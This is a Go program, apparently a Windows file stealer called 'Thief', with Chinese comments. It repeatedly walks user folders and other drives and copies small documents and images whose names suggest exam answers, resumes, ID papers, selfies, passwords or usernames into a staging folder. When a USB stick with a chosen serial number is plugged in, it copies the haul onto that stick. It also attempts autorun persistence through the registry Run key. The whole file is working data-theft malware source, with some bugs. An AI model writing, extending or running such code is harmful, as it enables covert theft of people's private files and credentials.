package main

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

var gotFiles []string

// 1.创建存储临时文件的文件夹
var dstPath = ".\\test\\teste\\"
var isUDisk bool
var wg sync.WaitGroup
var UDiskName string
var drives []string

// func MkdirAll(path string, perm FileMode) error
// 2.搜索相关文件并拷贝到目标文件夹
func scanDir(dir string, flagCode bool) []string {
	var files []string
	// 2.搜索相关文件并拷贝到目标文件夹
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		// 设置禁止扫描目录
		strContainers := strings.Contains(path, dstPath)
		if !strContainers || flagCode {
			// 判断是否是目录
			if info.IsDir() {
				return nil
			}
			// 判断文件大小
			if info.Size() > 10000000 {
				return nil
			}
			// 判断文件名
			filename := info.Name()
			if !flagCode {
				for _, gotFileName := range gotFiles {
					if gotFileName == filename+path {
						return nil
					}
				}
			}
			flagWd := [...]string{"申请", "报告", "答案", "试题", "论文", "试卷", "招聘", "简历", "公司", "大学", "证件", "自拍", "passwd", "passwrod", "username"}
			for i := 0; i < len(flagWd); i++ {
				strContainers := strings.Contains(filename, flagWd[i])
				if strContainers {
					// 添加符合条件的文件的文件名，防止重复添加
					gotFiles = append(gotFiles, filename+path)
					fmt.Println("发现符合特征文件 --> " + filename)
					// 判断文件名后缀
					fileSuffix := filepath.Ext(path)
					switch fileSuffix {
					case ".docx":
						files = append(files, filename+"||"+path)
					case "xlsx":
						files = append(files, filename+"||"+path)
					case ".txt":
						files = append(files, filename+"||"+path)
					case ".doc":
						files = append(files, filename+"||"+path)
					case ".jpg":
						files = append(files, filename+"||"+path)
					case ".png":
						files = append(files, filename+"||"+path)
					}
				}
			}

		}
		return nil
	})
	if err != nil {
		return nil
	}
	return files
}

// 复制文件到制定目录
func copyFile(dstName, srcName string) (written int64, err error) {
	fmt.Println("正在复制 | " + srcName + " --> " + dstName)
	src, err := os.Open(srcName)
	if err != nil {
		fmt.Println("srcFile error opening")
	}
	defer src.Close()
	dst, err := os.OpenFile(dstName, os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		fmt.Println("dstFile error opening")
	}
	defer dst.Close()
	return io.Copy(dst, src)
}

// 3.检测磁盘
func GetSystemDisks() []string {
	// 获取系统dll
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	// 获取dll中函数
	GetLogicalDrives := kernel32.MustFindProc("GetLogicalDrives")
	// 调用dll中函数
	n, _, _ := GetLogicalDrives.Call()
	s := strconv.FormatInt(int64(n), 2)
	var allDrives = []string{"A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:",
		"I:", "J:", "K:", "L:", "M:", "N:", "O:", "P：", "Q：", "R：", "S：", "T：",
		"U：", "V：", "W：", "X：", "Y：", "Z："}
	temp := allDrives[0:len(s)]
	var d []string
	for i, v := range s {
		if v == 49 {
			l := len(s) - i - 1
			d = append(d, temp[l])
		}
	}
	var drives []string
	for i, v := range d {
		drives = append(drives[i:], append([]string{v}, drives[:i]...)...)
	}
	return drives
}

// 设置开启自启动
func checkRegistry() {
	key, exists, _ := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run Thief`, registry.ALL_ACCESS)
	defer key.Close()
	if exists {
		fmt.Println("already have registry key")
	} else {
		fmt.Println("Registry should create")
	}
	//key.SetStringValue("D:\\Program Files\\Thief.exe", "Thief")
}

// 检测特定U盘
func checkUDisk() []string {
	var udiskName []string
	//查询插入的u盘个数
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\USBSTOR\Enum`, registry.QUERY_VALUE)
	if err != nil {
		fmt.Println("Error")
	}
	defer k.Close()
	n, _, err := k.GetIntegerValue("Count")
	if err != nil {
		fmt.Println("Error")
	}
	if n < 1 {
		fmt.Println("没有检测到u盘！")
	}
	//查询u盘序列号
	var sn string
	information, _, err := k.GetStringValue(strconv.Itoa(0))
	strn := strconv.FormatUint(n, 10) //n是uint64类型，先转成string
	nInt, _ := strconv.Atoi(strn)     //再转成int类型
	if n > 1 {
		fmt.Printf("\n检测到多个u盘\n\n")
	}
	for i := 0; i < nInt; i++ {
		information, _, err = k.GetStringValue(strconv.Itoa(i))
		if err != nil {
			fmt.Println("Error")
		}
		sn = strings.Split(information, "\\")[2]
		if sn == "特定U盘序列号" {
			isUDisk = true
			disks := GetSystemDisks()
			return disks[len(disks)-i:]
		} else {
			isUDisk = false
		}
	}
	return udiskName
}

func addScan(srcPath string, flagCode bool) error {
	defer wg.Done()
	var srcFilePath string
	var dstFilePath string
	files := scanDir(srcPath, flagCode)
	for _, path := range files {
		srcFilePath = strings.Split(path, "||")[1]
		Name := strings.Split(path, "||")[0]
		dstFilePath = dstPath + Name
		if flagCode {
			// 将扫描到的文件写入U盘
			dstFilePath = UDiskName + "\\thief\\" + Name
			fmt.Println("正在将扫描到的文件写入U盘..." + dstFilePath)
		}
		_, err := copyFile(dstFilePath, srcFilePath)
		if err != nil {
			fmt.Println("Copy File Error")
		}
	}
	return nil
}
func main() {
	//文件存放地址
	path_err := os.MkdirAll(dstPath, 0644)
	if path_err != nil {
		fmt.Println("error creating directory")
	}
	for {
		checkRegistry()
		udiskName := checkUDisk()
		drives = GetSystemDisks()
		// 发现特定U盘
		if len(udiskName) > 0 {
			for _, v := range udiskName {
				UDiskName = v
			}
		}
		for _, k := range drives {
			strContainers := strings.Contains(k, "C:")
			if strContainers {
				k = "C:\\Users"
			} else if k == UDiskName {
				k = dstPath
			} else {
				k = k + "\\"
			}
			fmt.Println("正在扫描 --> " + k)
			fmt.Println("是否存在特定U盘:" + strconv.FormatBool(isUDisk))
			wg.Add(1)
			go addScan(k, isUDisk)
		}
		wg.Wait()
		fmt.Println("睡眠10秒，等待新一轮扫描...")
		time.Sleep(1000 * time.Millisecond)
	}
}
